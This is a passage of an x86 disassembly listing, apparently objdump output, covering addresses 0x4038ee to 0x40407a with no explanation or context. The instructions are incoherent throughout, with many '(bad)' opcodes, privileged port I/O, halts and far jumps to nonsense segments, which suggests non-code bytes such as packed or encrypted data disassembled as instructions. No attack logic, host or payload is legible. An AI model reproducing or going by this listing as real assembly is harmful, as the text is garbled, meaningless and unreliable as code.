  4038ee:	loope  0x40395a
  4038f0:	xor    DWORD PTR [eax-0x73827b80],ecx
  4038f6:	pop    eax
  4038f7:	mov    eax,ds:0xc5ad865
  4038fc:	mov    eax,0x29665af8
  403901:	lea    eax,[ebx]
  403903:	mov    edx,0xc04af082
  403908:	and    al,0x24
  40390a:	add    DWORD PTR [ebp+0x6f],0xb7742562
  403911:	leave  
  403912:	bound  ebx,QWORD PTR [ebp-0x47]
  403915:	xchg   edi,eax
  403916:	pushf  
  403917:	pop    esi
  403918:	jns    0x403976
  40391a:	pop    ebx
  40391b:	fwait
  40391c:	mov    esp,0xccb5a528
  403921:	(bad)  
  403922:	test   DWORD PTR ss:[edx],ebp
  403925:	rcl    BYTE PTR [esi+eax*4],0xf6
  403929:	int3   
  40392a:	mov    DWORD PTR [ebx-0x3bd26d93],0x8e273b62
  403934:	and    ch,ah
  403936:	fisttp DWORD PTR [edx-0x4a9d0cfe]
  40393c:	gs sub eax,0xb03867ee
  403942:	jmp    0x403926
  403944:	pop    edi
  403945:	call   0xbf86:0x84c9c292
  40394c:	nop
  40394d:	inc    esp
  40394e:	inc    ebp
  40394f:	mov    esi,0xe86cdb17
  403954:	and    bl,BYTE PTR [ebp+0x70]
  403957:	or     eax,esi
  403959:	mov    eax,0x325a5c62
  40395e:	adc    eax,0xd5a18ad9
  403963:	pusha  
  403964:	mov    ecx,0xf3c2e226
  403969:	push   ds
  40396a:	pusha  
  40396b:	jmp    0x403995
  40396d:	xor    DWORD PTR ds:0x4e1532ce,0x63c16b76
  403977:	es pop es
  403979:	fmul   DWORD PTR [eax+eiz*4]
  40397c:	cs and eax,0x5b0648e4
  403982:	loopne 0x4039ad
  403984:	ss sub al,0x53
  403987:	or     al,0xe5
  403989:	pop    esi
  40398a:	jbe    0x40391d
  40398c:	or     BYTE PTR [eax+0x2e],ah
  40398f:	adc    DWORD PTR [ecx+0x3d992190],eax
  403995:	imul   ebx,DWORD PTR [ebp+0x36e9f43f],0x1670df37
  40399f:	mov    esi,0xac693868
  4039a4:	add    ebx,DWORD PTR [ebx]
  4039a6:	xchg   ebp,eax
  4039a7:	or     cl,BYTE PTR [eax-0x16]
  4039aa:	icebp  
  4039ab:	imul   ebp,DWORD PTR [ebp+edx*2-0x3c],0x40
  4039b0:	adc    eax,DWORD PTR [ecx-0x1]
  4039b3:	dec    edx
  4039b4:	xor    al,0x7
  4039b6:	mov    BYTE PTR [ecx-0x25],dl
  4039b9:	scas   al,BYTE PTR es:[edi]
  4039ba:	xchg   esi,eax
  4039bb:	cs inc edx
  4039bd:	out    0x18,eax
  4039bf:	outs   dx,DWORD PTR ds:[esi]
  4039c0:	hlt    
  4039c1:	or     ebx,DWORD PTR [esi]
  4039c3:	test   eax,esi
  4039c5:	iret   
  4039c6:	dec    eax
  4039c7:	outs   dx,DWORD PTR ds:[esi]
  4039c8:	xchg   esi,eax
  4039c9:	inc    ecx
  4039ca:	lods   eax,DWORD PTR ds:[esi]
  4039cb:	pop    esp
  4039cc:	xor    ebp,eax
  4039ce:	loope  0x40398f
  4039d0:	jmp    0xfbdb:0xe1100070
  4039d7:	fcmovu st,st(3)
  4039d9:	(bad)  
  4039da:	mov    dl,0x95
  4039dc:	cmp    al,0xe6
  4039de:	pusha  
  4039df:	inc    ecx
  4039e0:	adc    al,0xc9
  4039e2:	dec    ebx
  4039e3:	loopne 0x403a24
  4039e5:	mov    ch,0x23
  4039e7:	mov    ds:0xab30f585,eax
  4039ec:	adc    al,0x91
  4039ee:	adc    DWORD PTR [edi+0x42],ebp
  4039f1:	xchg   ebx,eax
  4039f2:	in     eax,dx
  4039f3:	xor    eax,0x8f278e0c
  4039f8:	mov    ch,0x96
  4039fa:	xchg   ecx,eax
  4039fb:	sbb    esp,ebx
  4039fd:	jns    0x403a02
  4039ff:	jnp    0x40399b
  403a01:	popf   
  403a02:	mov    edi,0x155acca4
  403a07:	fimul  DWORD PTR [edx-0x3c3ab85a]
  403a0d:	add    al,0x18
  403a0f:	push   ecx
  403a10:	imul   edi,DWORD PTR [esi-0x1d235b9],0xc3fc52f5
  403a1a:	hlt    
  403a1b:	fiadd  DWORD PTR [ecx]
  403a1d:	fdiv   DWORD PTR [edx+0x3c667f6f]
  403a23:	xor    eax,0xfcf26764
  403a28:	inc    edx
  403a29:	push   eax
  403a2a:	std    
  403a2b:	arpl   WORD PTR [ebx],bx
  403a2d:	ds in  eax,dx
  403a2f:	test   al,0x95
  403a31:	je     0x4039d7
  403a33:	mov    ebp,0x38516c24
  403a38:	or     eax,0xf7ae8cd2
  403a3d:	sbb    BYTE PTR [esi+0x5a],ah
  403a40:	clc    
  403a41:	rcl    BYTE PTR fs:[eax*4-0x7906eb48],0x1
  403a4a:	retf   0x7d19
  403a4d:	int3   
  403a4e:	cmp    eax,0xe9c9dd4d
  403a53:	call   0x3ce2:0xf4ccf752
  403a5a:	xchg   DWORD PTR [edi-0x2e],ebp
  403a5d:	dec    ebp
  403a5e:	pop    ss
  403a5f:	fstp   DWORD PTR [edi]
  403a61:	and    al,0x48
  403a63:	dec    edi
  403a64:	add    ah,ah
  403a66:	inc    edx
  403a67:	sub    edx,ebp
  403a69:	inc    ecx
  403a6a:	mov    al,ds:0x431bc86a
  403a6f:	sbb    esp,DWORD PTR [eax+0x52]
  403a72:	fild   WORD PTR [esi+ebp*2+0x710767c0]
  403a79:	mov    dl,0x1d
  403a7b:	xor    DWORD PTR [edi],0x1c
  403a7e:	push   ebx
  403a7f:	loope  0x403a45
  403a81:	jno    0x403a1a
  403a83:	pfcmpge mm6,mm4
  403a87:	push   0x1d80bfa
  403a8c:	pop    ecx
  403a8d:	scas   al,BYTE PTR es:[edi]
  403a8e:	data16 jbe 0x403a83
  403a91:	sub    DWORD PTR [edx],eax
  403a93:	push   cs
  403a94:	mov    edx,0xc77254a6
  403a99:	mov    ds:0x621a35e0,eax
  403a9e:	ins    DWORD PTR es:[edi],dx
  403a9f:	or     ecx,DWORD PTR [esi]
  403aa1:	cwde   
  403aa2:	or     esi,DWORD PTR [eax-0x3e01c5a7]
  403aa8:	jp     0x403acd
  403aaa:	stos   DWORD PTR es:[edi],eax
  403aab:	je     0x403b21
  403aad:	xor    bh,ah
  403aaf:	out    0x52,al
  403ab1:	or     DWORD PTR [edi],esp
  403ab3:	ja     0x21f24395
  403ab9:	pop    esi
  403aba:	add    al,0x4
  403abc:	(bad)  
  403abd:	scas   eax,DWORD PTR es:[edi]
  403abe:	mov    ecx,0xa7ee5705
  403ac3:	comiss xmm2,DWORD PTR [edi+0x250eb1d6]
  403aca:	and    ecx,DWORD PTR ds:0xf94a2131
  403ad0:	repz cmp ecx,DWORD PTR [edi-0x3aee090a]
  403ad7:	cmc    
  403ad8:	popa   
  403ad9:	sub    cl,dh
  403adb:	hlt    
  403adc:	pop    edi
  403add:	out    0x59,al
  403adf:	pop    esi
  403ae0:	outs   dx,BYTE PTR ds:[esi]
  403ae1:	xchg   ecx,eax
  403ae2:	daa    
  403ae3:	lods   eax,DWORD PTR ds:[esi]
  403ae4:	and    BYTE PTR [ecx],0x66
  403ae7:	cdq    
  403ae8:	cmp    eax,0xf0f939f3
  403aed:	mov    al,0x95
  403aef:	out    dx,eax
  403af0:	inc    esi
  403af1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403af2:	dec    edi
  403af3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403af4:	ss xor edi,esp
  403af7:	add    al,0x47
  403af9:	cmp    BYTE PTR [eax+0x37],bl
  403afc:	cwde   
  403afd:	dec    ecx
  403afe:	sub    al,0x66
  403b00:	xchg   ebx,eax
  403b01:	cld    
  403b02:	imul   esp,DWORD PTR [ebx],0xc1cfa498
  403b08:	ss aas 
  403b0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b0b:	mov    ebx,0xb096190
  403b10:	pop    es
  403b11:	xchg   ebp,eax
  403b12:	push   edi
  403b13:	xchg   ebp,eax
  403b14:	push   es
  403b15:	out    dx,al
  403b16:	inc    BYTE PTR [ebx-0x68]
  403b19:	jo     0x403b02
  403b1b:	fld    DWORD PTR [esi-0x7a]
  403b1e:	adc    dh,0x54
  403b21:	or     BYTE PTR [ebp*2-0x6d7f10f2],0xcf
  403b29:	ficomp DWORD PTR [ecx-0x44]
  403b2c:	(bad)  
  403b2d:	daa    
  403b2e:	out    dx,eax
  403b2f:	xor    ch,dl
  403b31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b32:	mov    ds:0x685028b7,al
  403b37:	pop    ds
  403b38:	and    BYTE PTR [ebx+0x6f816e6b],dh
  403b3e:	mov    DWORD PTR ds:0xeea7e01b,ebx
  403b44:	xlat   BYTE PTR ds:[ebx]
  403b45:	mov    ah,cl
  403b47:	jno    0x403b1e
  403b49:	leave  
  403b4a:	out    0xc7,al
  403b4c:	xor    ecx,DWORD PTR [edi]
  403b4e:	lea    eax,[esi-0x7d3eb1ac]
  403b54:	push   ecx
  403b55:	iret   
  403b56:	inc    edx
  403b57:	mov    ds:0xb2a5b856,eax
  403b5c:	test   DWORD PTR [edx-0x1fb1b8a7],edx
  403b62:	mov    eax,DWORD PTR [esi+ebp*4+0x23]
  403b66:	push   0xffffffa7
  403b68:	test   dh,0x78
  403b6b:	mov    ebx,0x5008802a
  403b70:	mov    bl,0x4b
  403b72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b73:	dec    edi
  403b74:	jecxz  0x403bbc
  403b76:	mov    es,ecx
  403b78:	push   eax
  403b79:	sub    ebp,DWORD PTR [ecx+0x7a]
  403b7c:	sub    al,0x5e
  403b7e:	xchg   esp,eax
  403b7f:	aaa    
  403b80:	mov    ah,BYTE PTR [ebp-0x6d]
  403b83:	jne    0x403b3a
  403b85:	and    eax,ebp
  403b87:	jne    0x403bc6
  403b89:	mov    eax,ds:0x85f8db03
  403b8e:	(bad)  
  403b8f:	imul   ecx,DWORD PTR [edx-0x35],0xffffffb3
  403b93:	xchg   esp,eax
  403b94:	xchg   edx,eax
  403b95:	inc    esi
  403b96:	test   al,0x3c
  403b98:	xlat   BYTE PTR ds:[ebx]
  403b99:	mov    DWORD PTR [ebp+0x32],0x6a75a47c
  403ba0:	repz cmp dl,BYTE PTR [ebx+0x39473659]
  403ba7:	outs   dx,BYTE PTR ds:[esi]
  403ba8:	xchg   edx,eax
  403ba9:	ret    0x9af7
  403bac:	mov    dl,0x62
  403bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403baf:	aaa    
  403bb0:	mov    dl,bh
  403bb2:	dec    esi
  403bb3:	inc    esi
  403bb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bb5:	jns    0x403b40
  403bb7:	faddp  st(4),st
  403bb9:	push   ds
  403bba:	leave  
  403bbb:	mov    al,ds:0x8268bc0
  403bc0:	in     al,0x2e
  403bc2:	add    BYTE PTR [edi+edx*1+0x7e],dl
  403bc6:	rcr    dl,cl
  403bc8:	bound  ebx,QWORD PTR [esi+0x7b]
  403bcb:	xor    al,0xd2
  403bcd:	mov    ebx,0x77939cc6
  403bd2:	fsub   st,st(0)
  403bd4:	dec    eax
  403bd5:	int3   
  403bd6:	in     eax,dx
  403bd7:	pmullw mm6,QWORD PTR [edx*2-0x31d10f30]
  403bdf:	sbb    eax,0x22bb7fe5
  403be4:	inc    edi
  403be5:	hlt    
  403be6:	stos   DWORD PTR es:[edi],eax
  403be7:	(bad)  
  403be8:	mov    ebp,0xf575def5
  403bed:	jbe    0x403c0e
  403bef:	push   ecx
  403bf0:	arpl   bx,cx
  403bf2:	das    
  403bf3:	add    al,0xf3
  403bf5:	or     ch,BYTE PTR [eax-0x4]
  403bf8:	jmp    0xa53f:0x723bd4a5
  403bff:	stos   DWORD PTR es:[edi],eax
  403c00:	test   al,0xa5
  403c02:	and    ch,BYTE PTR [edi]
  403c04:	iret   
  403c05:	fadd   st,st(0)
  403c07:	sub    eax,0x81c0c605
  403c0c:	mov    edi,ecx
  403c0e:	pop    edi
  403c0f:	jns    0x403c3f
  403c11:	jg     0x403bb1
  403c13:	push   ds
  403c14:	pop    ebx
  403c15:	xchg   dl,bl
  403c17:	out    dx,al
  403c18:	dec    edx
  403c19:	iret   
  403c1a:	icebp  
  403c1b:	ror    BYTE PTR [ebx],0x80
  403c1e:	cmp    eax,0x61d7b82d
  403c23:	mov    dh,0xb8
  403c25:	jge    0x403bb7
  403c27:	and    bl,BYTE PTR [eax+edx*8]
  403c2a:	pop    DWORD PTR [edx]
  403c2c:	inc    ebx
  403c2d:	mov    ebx,0x6d73fb6c
  403c32:	adc    BYTE PTR [eax],cl
  403c34:	int    0x32
  403c36:	mov    BYTE PTR [edx],dl
  403c38:	xchg   edx,eax
  403c39:	push   ds
  403c3a:	ret    
  403c3b:	stc    
  403c3c:	xor    al,0x2
  403c3e:	dec    edi
  403c3f:	out    0x54,al
  403c41:	cli    
  403c42:	inc    ecx
  403c43:	dec    edi
  403c44:	stos   BYTE PTR es:[edi],al
  403c45:	mov    bl,0xa9
  403c47:	cmp    BYTE PTR [ebx+0x6c],bh
  403c4a:	out    dx,al
  403c4b:	sbb    al,0xad
  403c4d:	push   ebp
  403c4e:	rcr    BYTE PTR [edx+0x2c],1
  403c51:	pop    esi
  403c52:	fild   QWORD PTR [ebx]
  403c54:	pop    es
  403c55:	cmp    ebx,esi
  403c57:	outs   dx,DWORD PTR ds:[esi]
  403c58:	rcr    BYTE PTR [eax+0x60],1
  403c5b:	call   0x24e7d975
  403c60:	sbb    esp,DWORD PTR [edi]
  403c62:	inc    ecx
  403c63:	mov    eax,ds:0xcae0402d
  403c68:	mov    ss,ebx
  403c6a:	(bad)  
  403c6b:	sbb    BYTE PTR [esi+eiz*2],dl
  403c6e:	xor    cl,bl
  403c70:	jmp    0x403c16
  403c72:	pop    ecx
  403c73:	out    dx,eax
  403c74:	arpl   sp,ax
  403c76:	cwde   
  403c77:	cmp    DWORD PTR [ecx],ebx
  403c79:	lea    ebx,[edx]
  403c7b:	dec    esp
  403c7c:	cdq    
  403c7d:	dec    ecx
  403c7e:	pusha  
  403c7f:	stos   DWORD PTR es:[edi],eax
  403c80:	sahf   
  403c81:	into   
  403c82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c83:	cmp    bh,bl
  403c85:	(bad)  
  403c86:	std    
  403c87:	out    0x93,al
  403c89:	daa    
  403c8a:	les    ecx,FWORD PTR [eax]
  403c8c:	jecxz  0x403c0f
  403c8e:	sbb    bl,BYTE PTR [esi+0x44919add]
  403c94:	cli    
  403c95:	pop    ebx
  403c96:	mov    ebx,0xd34061c7
  403c9b:	fadd   QWORD PTR [edi+0x36]
  403c9e:	fsubr  DWORD PTR [edi-0x2d]
  403ca1:	jmp    0x403c93
  403ca3:	or     al,dh
  403ca5:	pop    edx
  403ca6:	dec    ebp
  403ca7:	push   ebx
  403ca8:	js     0x403c2d
  403caa:	outs   dx,BYTE PTR ds:[esi]
  403cab:	inc    ecx
  403cac:	mov    ebp,0x11308799
  403cb1:	fsub   DWORD PTR [edx]
  403cb3:	in     eax,dx
  403cb4:	push   esi
  403cb5:	inc    esp
  403cb6:	mov    ebp,0x7f83428b
  403cbb:	xchg   edx,eax
  403cbc:	push   ebp
  403cbd:	adc    BYTE PTR [ebx+0xd],ah
  403cc0:	int    0xbc
  403cc2:	pop    ss
  403cc3:	stc    
  403cc4:	mov    ds:0xec17eee6,al
  403cc9:	fcomp  st(7)
  403ccb:	lds    ecx,FWORD PTR [ebx+edx*1-0x50]
  403ccf:	shr    DWORD PTR [edx-0x248fe9e],0x74
  403cd6:	sti    
  403cd7:	sbb    edx,DWORD PTR [eax+0x5]
  403cda:	pop    ebx
  403cdb:	lds    ecx,FWORD PTR [ecx]
  403cdd:	add    BYTE PTR [edx],ah
  403cdf:	retf   
  403ce0:	jo     0x403ce5
  403ce2:	inc    esp
  403ce3:	adc    cl,bh
  403ce5:	xor    ebp,esp
  403ce7:	outs   dx,BYTE PTR ds:[esi]
  403ce8:	out    dx,eax
  403ce9:	lds    edi,FWORD PTR [edx+0x58af41f8]
  403cef:	push   ebp
  403cf0:	lea    esi,[eax]
  403cf2:	jg     0x403c8c
  403cf4:	xor    BYTE PTR [edi-0x1e],al
  403cf7:	out    0xb7,al
  403cf9:	xchg   ebp,eax
  403cfa:	add    esi,DWORD PTR [ebp-0x13b0165f]
  403d00:	add    al,0x4b
  403d02:	cli    
  403d03:	mov    eax,ds:0xa2a89ee6
  403d08:	loop   0x403cca
  403d0a:	and    eax,0xba81524e
  403d0f:	sahf   
  403d10:	xlat   BYTE PTR ds:[ebx]
  403d11:	outs   dx,BYTE PTR ds:[esi]
  403d12:	push   esp
  403d13:	pop    edx
  403d14:	fs out 0x9f,al
  403d17:	je     0x403cf3
  403d19:	jmp    0x403d0a
  403d1b:	xchg   ecx,eax
  403d1c:	jno    0x403d85
  403d1e:	stos   BYTE PTR es:[edi],al
  403d1f:	push   ebx
  403d20:	loop   0x403cd8
  403d22:	adc    DWORD PTR [ebx+0x54e85295],edx
  403d28:	clc    
  403d29:	fcomp  QWORD PTR [edi-0x4dbd0308]
  403d2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d30:	xchg   edi,eax
  403d31:	js     0x403ce9
  403d33:	arpl   WORD PTR [ebx+0x2],si
  403d36:	mov    ah,dl
  403d38:	push   esp
  403d39:	or     dl,BYTE PTR [esi-0x4b]
  403d3c:	dec    edx
  403d3d:	push   es
  403d3e:	mov    al,ds:0x4e6bfeb0
  403d43:	addr16 inc ebp
  403d45:	cmp    BYTE PTR [edi],dh
  403d47:	inc    ecx
  403d48:	dec    esp
  403d49:	xor    ecx,esi
  403d4b:	push   ebx
  403d4c:	sub    al,0x99
  403d4e:	xchg   ebx,eax
  403d4f:	lds    esp,FWORD PTR [ebp-0x42d6c37]
  403d55:	cmc    
  403d56:	test   cl,dh
  403d58:	stc    
  403d59:	lods   eax,DWORD PTR ds:[esi]
  403d5a:	pusha  
  403d5b:	xor    ebx,DWORD PTR [ecx-0x47]
  403d5e:	test   DWORD PTR [eax],edx
  403d60:	mov    ds:0xecc1f212,al
  403d65:	adc    DWORD PTR ds:0x3cf0d995,0x0
  403d6c:	xor    DWORD PTR [edi+edi*8-0x7a4461e6],esp
  403d73:	mov    edx,0xb62975f
  403d78:	(bad)  
  403d7a:	lods   eax,DWORD PTR ds:[esi]
  403d7b:	pop    ss
  403d7c:	sub    bl,bl
  403d7e:	ja     0x403dac
  403d80:	(bad)  
  403d81:	mov    esi,0x579cf959
  403d86:	xor    bh,BYTE PTR [ebx]
  403d88:	sub    ch,ah
  403d8a:	mov    ah,0xd5
  403d8c:	xor    al,BYTE PTR [edi]
  403d8e:	cmova  bx,bx
  403d92:	mov    bl,0x73
  403d94:	bswap  esp
  403d96:	or     al,0x73
  403d98:	push   ss
  403d99:	xchg   edi,eax
  403d9a:	ss popa 
  403d9c:	out    0x3e,eax
  403d9e:	mov    bl,0x81
  403da0:	mov    ch,0xe7
  403da2:	in     eax,0x1f
  403da4:	shl    DWORD PTR [ebx+0x6aede040],0xc8
  403dab:	lds    ecx,FWORD PTR [ebx-0x15]
  403dae:	bound  edi,QWORD PTR [ecx-0x1c]
  403db1:	add    BYTE PTR [ebp+0x25],bh
  403db4:	mov    edi,0xcc97dc47
  403db9:	rol    BYTE PTR [ebx-0x1fc587a7],1
  403dbf:	sub    ebp,DWORD PTR fs:[esp+ebx*1-0x4232075b]
  403dc7:	xor    al,0xb1
  403dc9:	pop    esp
  403dca:	xor    DWORD PTR [esp+eiz*8+0x59],edi
  403dce:	shl    ebx,1
  403dd0:	arpl   WORD PTR [ebp+0x77e22dd5],ax
  403dd6:	ret    
  403dd7:	cmp    ebx,edi
  403dd9:	jb     0x403d9f
  403ddb:	mov    ch,0x4c
  403ddd:	jmp    0x403d80
  403ddf:	ja     0x403e30
  403de1:	es dec esp
  403de3:	scas   eax,DWORD PTR es:[edi]
  403de4:	dec    ebx
  403de5:	mov    BYTE PTR [ebx],dh
  403de7:	inc    edx
  403de8:	cli    
  403de9:	mov    WORD PTR [edx-0x2e317a11],fs
  403def:	xchg   edx,eax
  403df0:	cs mov esi,0xceb4cfee
  403df6:	pusha  
  403df7:	in     al,0xe
  403df9:	xchg   ecx,eax
  403dfa:	sub    al,0x28
  403dfc:	loop   0x403db0
  403dfe:	pop    ecx
  403dff:	les    edx,FWORD PTR [eax-0x52]
  403e02:	adc    eax,0x47b27634
  403e07:	pop    ebp
  403e08:	or     edx,edi
  403e0a:	je     0x403e47
  403e0c:	mov    edx,edx
  403e0e:	repnz outs dx,BYTE PTR ds:[esi]
  403e10:	inc    BYTE PTR [edx+0x5e]
  403e13:	sbb    eax,0xefcd184c
  403e18:	xchg   esi,eax
  403e19:	sub    eax,0xc07dd96d
  403e1e:	lahf   
  403e1f:	sar    BYTE PTR [ebx],1
  403e21:	call   0x938ec93a
  403e26:	sbb    BYTE PTR [ebx+ecx*1+0x412eceec],al
  403e2d:	cmp    BYTE PTR [eax],0xbd
  403e30:	aaa    
  403e31:	cdq    
  403e32:	test   BYTE PTR [esi-0x5a],cl
  403e35:	xchg   DWORD PTR [ebp+0x5617de56],ebx
  403e3b:	rol    BYTE PTR [esi+ecx*8],1
  403e3e:	dec    ebx
  403e3f:	fwait
  403e40:	inc    eax
  403e41:	push   esi
  403e42:	jbe    0x403ea0
  403e44:	pop    ecx
  403e45:	mov    cl,0x57
  403e47:	out    dx,al
  403e48:	stos   BYTE PTR es:[edi],al
  403e49:	jmp    FWORD PTR [ebp+0x26]
  403e4c:	mov    edx,eax
  403e4e:	adc    eax,0xa8146635
  403e53:	dec    esi
  403e54:	and    al,0xb3
  403e56:	add    dh,BYTE PTR [edi]
  403e58:	popa   
  403e59:	pop    edi
  403e5a:	cli    
  403e5b:	mov    cl,0xd8
  403e5d:	mov    ebp,0x795c422
  403e62:	cmp    eax,0x5f0592f9
  403e67:	(bad)  
  403e68:	idiv   DWORD PTR [ecx-0x134519b8]
  403e6e:	xchg   esp,eax
  403e6f:	xor    al,0x34
  403e71:	out    dx,al
  403e72:	sbb    DWORD PTR [edx],ebx
  403e74:	out    dx,al
  403e75:	push   esi
  403e76:	push   esp
  403e77:	inc    ecx
  403e78:	or     ebp,DWORD PTR [edi-0x7a]
  403e7b:	jno    0x403e54
  403e7d:	dec    ecx
  403e7e:	or     bh,BYTE PTR [edi]
  403e80:	daa    
  403e81:	push   ecx
  403e82:	ret    
  403e83:	loopne 0x403e55
  403e85:	fdiv   QWORD PTR [ecx+0x71a68c26]
  403e8b:	add    eax,0xa20742b
  403e90:	mov    esp,0x70a0a49
  403e95:	sar    DWORD PTR [ebx+0x38b75e1c],1
  403e9b:	dec    ecx
  403e9c:	fnsave [ebp+0x7]
  403e9f:	retf   
  403ea0:	mov    eax,ds:0x3f565a0a
  403ea5:	xchg   ebp,eax
  403ea6:	sub    al,0xde
  403ea8:	addr16 aaa 
  403eaa:	inc    esp
  403eab:	cmp    DWORD PTR [ebx+0x5141fffe],eax
  403eb1:	inc    esp
  403eb2:	into   
  403eb3:	dec    BYTE PTR [ebx+edx*8]
  403eb6:	popa   
  403eb7:	jo     0x403e65
  403eb9:	outs   dx,BYTE PTR ds:[esi]
  403eba:	stc    
  403ebb:	in     al,0x21
  403ebd:	inc    eax
  403ebe:	(bad)  
  403ebf:	jmp    DWORD PTR [edx]
  403ec1:	dec    cx
  403ec3:	mov    al,ds:0x6da10ead
  403ec8:	out    0x3a,eax
  403eca:	and    eax,ebx
  403ecc:	dec    eax
  403ecd:	adc    BYTE PTR [edi-0x3cd66c8f],dh
  403ed3:	dec    esp
  403ed4:	aad    0x91
  403ed6:	dec    esi
  403ed7:	js     0x403e86
  403ed9:	(bad)  
  403edb:	es push ecx
  403edd:	mov    edx,0xefee2fb9
  403ee2:	or     al,0x68
  403ee4:	shr    DWORD PTR [edi-0x3de3e953],1
  403eea:	mov    al,ds:0x2b966e8a
  403eef:	add    DWORD PTR [ecx+0x1],ecx
  403ef2:	ret    0xef78
  403ef5:	sub    eax,0xb8286276
  403efa:	imul   ecx,DWORD PTR [eax],0x38
  403efd:	add    eax,0xa035d299
  403f02:	gs gs xchg esi,eax
  403f05:	xor    eax,0x9df999ce
  403f0a:	adc    al,0xb1
  403f0c:	js     0x403ef6
  403f0e:	pop    edi
  403f0f:	clc    
  403f10:	rcl    DWORD PTR ds:[eax-0x35c1ef8],0x49
  403f18:	fmul   QWORD PTR [ebx+0x45f9b6ca]
  403f1e:	pusha  
  403f1f:	xor    bl,BYTE PTR [eax-0x5251bf6f]
  403f25:	push   0x28728b9d
  403f2a:	inc    eax
  403f2b:	jo     0x403f8a
  403f2d:	leave  
  403f2e:	(bad)  
  403f2f:	inc    ecx
  403f30:	pusha  
  403f31:	mov    BYTE PTR [eax+0x1],0x14
  403f35:	jbe    0x403ef4
  403f37:	and    al,0xde
  403f39:	and    eax,0xf553ba7c
  403f3e:	push   ds
  403f3f:	xor    ebx,DWORD PTR [esi-0x70a7b4cc]
  403f45:	dec    edx
  403f46:	rcr    DWORD PTR [eax+0x74097201],1
  403f4c:	shr    DWORD PTR [edi+eiz*1-0x50],cl
  403f50:	enter  0x7f19,0xc7
  403f54:	sbb    al,0xfd
  403f56:	jnp    0x403f22
  403f58:	adc    BYTE PTR [ecx],dh
  403f5a:	loop   0x403f05
  403f5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f5d:	dec    ebx
  403f5e:	fwait
  403f5f:	int    0x31
  403f61:	or     eax,0xbcb48763
  403f66:	call   0x1966290f
  403f6b:	adc    eax,0xf4e86feb
  403f70:	mov    WORD PTR [esi],cs
  403f72:	ret    0x3bbc
  403f75:	push   edi
  403f76:	cmp    esi,edx
  403f78:	sbb    eax,0xc5cb06c2
  403f7d:	and    al,BYTE PTR [edi+ecx*8+0x29]
  403f81:	push   ebp
  403f82:	jg     0x403f98
  403f84:	jmp    0xb54c426b
  403f89:	lea    eax,[ebp+0xb3baffc]
  403f8f:	pop    ebp
  403f90:	pminsw mm3,QWORD PTR [ebx]
  403f93:	sar    BYTE PTR ds:0x415b1de0,cl
  403f99:	mov    ds:0x27a8de70,eax
  403f9e:	fsub   QWORD PTR [edi]
  403fa0:	jmp    0x79b6:0x67c98812
  403fa7:	push   ss
  403fa8:	mov    ebp,0x1b05b68c
  403fad:	jge    0x403fc4
  403faf:	retf   0x34ef
  403fb2:	std    
  403fb3:	push   ds
  403fb4:	push   ebp
  403fb5:	pop    ds
  403fb6:	push   esp
  403fb7:	jg     0x403f4c
  403fb9:	push   eax
  403fba:	inc    ecx
  403fbb:	popa   
  403fbc:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fbe:	pop    edi
  403fbf:	inc    eax
  403fc0:	loope  0x403f94
  403fc2:	push   ebp
  403fc3:	and    DWORD PTR ds:0xe4f8a20a,edx
  403fc9:	sub    al,0x26
  403fcb:	shl    BYTE PTR [edx-0x1bb8d3b3],cl
  403fd1:	cmovl  edx,DWORD PTR [ecx-0x15]
  403fd5:	stos   BYTE PTR es:[edi],al
  403fd6:	cmp    al,0x9a
  403fd8:	add    al,0x53
  403fda:	push   ebx
  403fdb:	and    ecx,ecx
  403fdd:	fs cwde 
  403fdf:	stos   DWORD PTR es:[edi],eax
  403fe0:	dec    edi
  403fe1:	popa   
  403fe2:	inc    edi
  403fe3:	sbb    eax,0xa4f6300b
  403fe8:	or     al,ch
  403fea:	test   al,0x99
  403fec:	gs std 
  403fee:	add    al,0xc0
  403ff0:	dec    esi
  403ff1:	jp     0x404002
  403ff3:	dec    ecx
  403ff4:	dec    edi
  403ff5:	mov    ebp,0x646830b1
  403ffa:	mov    bh,0xef
  403ffc:	pop    ss
  403ffd:	mov    WORD PTR [edx+0x95c77e8],?
  404003:	dec    ebx
  404004:	pop    ecx
  404005:	xchg   edx,eax
  404006:	xchg   esp,eax
  404007:	cmp    eax,0x22571cba
  40400c:	popf   
  40400d:	cmp    al,0xe0
  40400f:	aad    0x19
  404011:	dec    esi
  404012:	es sbb al,0xff
  404015:	cmp    al,0x67
  404017:	aam    0x2b
  404019:	or     dh,ah
  40401b:	lods   al,BYTE PTR ds:[esi]
  40401c:	jl     0x404032
  40401e:	mov    eax,0x6d13387
  404023:	mov    bh,0x48
  404025:	ret    
  404026:	jae    0x403fd8
  404028:	add    ebx,DWORD PTR [ebp-0x10]
  40402b:	push   esp
  40402c:	int    0x46
  40402e:	mov    ebx,0x8534b0a0
  404033:	fimul  DWORD PTR [eax+0x19]
  404036:	or     ebx,DWORD PTR [ebx]
  404038:	xchg   edx,eax
  404039:	cli    
  40403a:	adc    DWORD PTR [esi+0x18],esi
  40403d:	sub    edx,DWORD PTR [ebx]
  40403f:	cmc    
  404040:	push   es
  404041:	pop    ebp
  404042:	adc    BYTE PTR [ebp+0x2fd47681],al
  404048:	cld    
  404049:	xlat   BYTE PTR ds:[ebx]
  40404a:	int3   
  40404b:	sbb    eax,edi
  40404d:	dec    edi
  40404e:	push   esp
  40404f:	cs inc esp
  404051:	push   ebp
  404052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404053:	dec    edx
  404054:	imul   ecx,DWORD PTR [esi+eiz*4],0x9b375d51
  40405b:	sahf   
  40405c:	mov    ds:0xb9346ff2,al
  404061:	fmulp  st(0),st
  404063:	jge    0x40406b
  404065:	pop    ds
  404066:	xchg   DWORD PTR [edi-0x40],eax
  404069:	pushf  
  40406a:	frstor [edx-0x1a2100f9]
  404070:	ror    BYTE PTR [edi+0x266dd8a3],1
  404076:	in     al,0x4
  404078:	jae    0x404089
  40407a:	fst    st(5)
